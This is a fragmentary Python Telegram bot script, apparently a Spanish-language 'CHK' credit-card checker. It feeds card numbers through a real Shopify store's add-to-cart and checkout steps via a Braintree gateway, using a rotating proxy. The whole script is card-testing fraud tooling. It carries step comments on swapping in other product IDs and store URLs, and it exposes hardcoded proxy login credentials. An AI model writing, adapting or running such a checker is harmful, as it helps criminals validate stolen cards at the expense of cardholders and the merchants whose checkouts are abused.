...
@Client.on_message(filters.command("hr", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
GATEWAY: <code>HERCULES</code>
PASARELA: <code>SHOPIFY + B3 $20</code> </b>""")
...
<b>あ MITSURI CHK あ</b>
<b>Gateway: <code>HERCULES</code></b>
<b>Proceso: Verificando...</b>
<b>Tarjeta:</b> <code>{ccs}</code>
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        
        session = requests.Session()
        session.proxies = {'https': 'http://rgmxokdn-rotate:hzukgsozg62g@p.webshare.io:80'}

        inicio = time.time()
        print("</> INICIADO...")
        #-----------PASO N° 1 REEMPLAZAR ID DEL PRODUCTO-----------#
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '40139309776944'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://supersmalls.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.supersmalls.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.supersmalls.com"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=63767380016&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B17122910111&checkout%5Btotal_price%5D=2069&checkout_submitted_request_url=https%3A%2F%2Fsupersmalls.com%2F26402357296%2Fcheckouts%2F612c8ca1721288afc16d3e609c3e9086%3Fprevious_step%3Dshipping_method%26step%3Dpayment_method&checkout_submitted_page_id=acac83f7-0050-4E40-0004-4751A27EC6AB&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=738&checkout%5Bclient_details%5D%5Bbrowser_height%5D=738&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=180'
